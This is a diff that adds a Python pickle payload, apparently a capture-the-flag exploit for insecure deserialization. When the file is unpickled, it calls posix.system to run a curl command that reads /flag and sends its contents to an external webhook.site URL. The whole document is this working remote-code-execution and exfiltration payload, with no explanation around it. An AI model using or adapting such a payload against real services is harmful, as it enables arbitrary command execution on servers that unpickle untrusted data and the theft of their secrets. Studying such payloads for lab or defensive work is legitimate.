@@ -1,0 +1,8 @@
+cposix
+system
+p0
+(Vcurl https://webhook.site/5f6caa35-76f1-41a4-852b-ae88ea8ee413/?a=`cat /flag`
+p1
+tp2
+Rp3
+.
